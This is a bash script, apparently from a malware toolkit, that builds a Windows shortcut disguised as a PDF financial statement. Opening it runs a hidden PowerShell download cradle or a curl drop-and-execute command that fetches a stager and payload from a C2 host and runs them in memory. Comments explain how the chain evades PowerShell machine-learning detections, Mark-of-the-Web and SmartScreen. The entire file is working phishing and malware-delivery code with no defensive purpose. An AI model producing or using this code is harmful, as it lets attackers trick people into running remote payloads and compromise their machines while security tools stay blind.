#!/usr/bin/env bash
# make_lnk_payload.sh - build the PDF-disguised launcher (.lnk) for the umbra
# delivery chain.
#
# It produces ONE file in dist/ (default: 2026-Q3_Financial_Statement.pdf.lnk). The real
# extension is ".lnk"; Explorer hides it because .lnk is a known type, so the
# item shows up as "2026-Q3_Financial_Statement.pdf" with the PDF icon taken from
# imageres.dll. Double-clicking it does NOT open a document: it runs
#   cmd.exe /c powershell -w hidden -nop -ep bypass -c "<cradle>"
# and the cradle downloads delivery/stage.ps1, runs it in memory and points it
# at the hex shellcode blob, so nothing executable is ever written to disk.
#
# MODE=curl drops PowerShell entirely: the .lnk runs
#   cmd.exe /c curl.exe -fsS --ssl-no-revoke -o "%TEMP%\<rand>.exe" <BLOB_URL>
#        && start "" "%TEMP%\<rand>.exe"
# Windows 10 1803+ ships curl.exe in System32 (schannel build). No
# powershell.exe on the command line means PowerShell ML detections
# (Trojan:Win32/Commando.AIml) have nothing to fire on; the dropped exe is
# started via ShellExecute and curl writes no Mark-of-the-Web, so there is no
# SmartScreen reputation prompt either.
#
# Requires only python3 (make_lnk.py speaks the MS-SHLLINK format directly, so
# the whole thing is produced on Kali with no Windows tooling).
#
# Run from the module root after scripts/build.sh and scripts/make_shellcode.sh:
#   bash scripts/make_lnk_payload.sh
#
# Env:
#   DOMAIN      public hostname served by the Cloudflare Tunnel
#               (default c2.example.com)
#   SCHEME      https (default; the tunnel gives a public TLS cert)
#   MODE        stage | reflect | curl - which launcher the cradle uses
#   STAGE_PATH  path of the stager on the server        (default /stage.ps1 or /reflect.ps1)
#   BLOB_PATH   path of the payload on the server       (default /blob.hex or /loader.exe)
#   NAME        file name shown by Explorer (default 2026-Q3_Financial_Statement.pdf)
#   ICON        IconLocation string (default imageres.dll,-187 = PDF icon)
#   SHOW        ShowCommand for the link  (default 7 = minimized)
#   FLAGS       extra args passed to stage.ps1 (e.g. "-Patch")
#   OUT         output directory (default dist)
#   OUTNAME     output file name  (default <NAME>.lnk)
set -euo pipefail
cd "$(dirname "$0")/.."

DOMAIN="${DOMAIN:-c2.example.com}"
SCHEME="${SCHEME:-https}"
MODE="${MODE:-stage}"
NAME="${NAME:-2026-Q3_Financial_Statement.pdf}"
ICON="${ICON:-%SystemRoot%\\System32\\imageres.dll,-187}"
SHOW="${SHOW:-7}"
FLAGS="${FLAGS:-}"
OUT="${OUT:-dist}"
OUTNAME="${OUTNAME:-$NAME.lnk}"

if [ "$MODE" = "reflect" ]; then
    # reflect mode: reflective PE loader (proven in-memory path) + loader.exe
    STAGE_PATH="${STAGE_PATH:-/reflect.ps1}"
    BLOB_PATH="${BLOB_PATH:-/loader.exe}"
elif [ "$MODE" = "curl" ]; then
    # curl mode: direct download + exec of loader.exe (no PowerShell)
    BLOB_PATH="${BLOB_PATH:-/loader.exe}"
else
    # stage mode: shellcode stager + hex blob (requires donut/sRDI conversion)
    STAGE_PATH="${STAGE_PATH:-/stage.ps1}"
    BLOB_PATH="${BLOB_PATH:-/blob.hex}"
fi

BASE="${SCHEME}://${DOMAIN}"
STAGE_URL="${BASE}${STAGE_PATH:-}"
BLOB_URL="${BASE}${BLOB_PATH}"

command -v python3 >/dev/null 2>&1 || { echo "[-] python3 required" >&2; exit 1; }
[ -f scripts/make_lnk.py ] || { echo "[-] scripts/make_lnk.py not found (run from the module root)" >&2; exit 1; }

# --- the cradle -----------------------------------------------------------------
if [ "$MODE" = "curl" ]; then
    # curl cradle: cmd.exe + the native System32 curl.exe. Downloads loader.exe
    # straight to %TEMP% under a random name and starts it via ShellExecute.
    # No PowerShell anywhere: nothing for Commando.AIml-style PS ML to see.
    # curl (schannel) needs --ssl-no-revoke: revocation checks fail on hosts
    # without CRL/OCSP reachability and curl errors out without it.
    # curl writes no Mark-of-the-Web, so the dropped exe starts without a
    # SmartScreen reputation prompt. Random 6-hex name per build.
    RND="$(printf '%02x%02x%02x' $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))"
    DROP="%TEMP%\\${RND}.exe"
    ARGS="/c curl.exe -fsS --ssl-no-revoke -o \"${DROP}\" \"${BLOB_URL}\" && start \"\" \"${DROP}\""
else
    # Download the stager as text and execute it as a scriptblock so its
    # parameters (-Url, -Patch, ...) can be supplied. Only New-Object/WebClient
    # + scriptblock are used, so no file lands on disk.
    if [ "$MODE" = "reflect" ]; then
        # reflect cradle: download reflect.ps1 (text) + loader.exe (bytes), then
        # run the loader with -Bytes so the PE is mapped in memory, never on disk.
        # -Wait -WaitSeconds 0 (0 = wait forever) keeps THIS powershell.exe alive for
        # the whole beacon lifetime: reflect.ps1 starts the mapped PE on a thread and
        # returns immediately, so without the wait the host would exit and tear the
        # beacon down before/right after its first check-in. The wait returns when the
        # beacon thread ends (e.g. after a 'kill' task), so nothing leaks.
        CRADLE="\$s=[Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('${STAGE_URL}')); \$pe=(New-Object Net.WebClient).DownloadData('${BLOB_URL}'); & ([scriptblock]::Create(\$s)) -Bytes \$pe -Wait -WaitSeconds 0 ${FLAGS}"
    else
        CRADLE="\$s=[Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('${STAGE_URL}')); & ([scriptblock]::Create(\$s)) -Url '${BLOB_URL}' ${FLAGS}"
    fi
    ARGS="/c powershell -w hidden -nop -ep bypass -c \"${CRADLE}\""
fi

mkdir -p "$OUT"

echo "[*] building $OUT/$OUTNAME"
echo "    mode  : $MODE"
if [ "$MODE" != "curl" ]; then
    echo "    stage : $STAGE_URL"
fi
echo "    blob  : $BLOB_URL"
echo "    icon  : $ICON"

python3 scripts/make_lnk.py \
  --target  'C:\Windows\System32\cmd.exe' \
  --args    "$ARGS" \
  --workdir 'C:\Windows\System32' \
  --name    "$NAME" \
  --icon    "$ICON" \
  --show    "$SHOW" \
  --output  "$OUT/$OUTNAME"

ls -l "$OUT/$OUTNAME"
echo
echo "[+] on the target, double-clicking \"$NAME\" (Explorer hides the .lnk)"
if [ "$MODE" = "curl" ]; then
    echo "    runs: cmd -> curl.exe -o %TEMP%\\<rand>.exe -> start (ShellExecute) of $BLOB_URL"
else
    echo "    runs: cmd -> powershell (hidden) -> $STAGE_URL -> in-memory exec of $BLOB_URL"
fi
echo "    serve it from dist/ (scripts/serve.sh) behind the Cloudflare Tunnel."
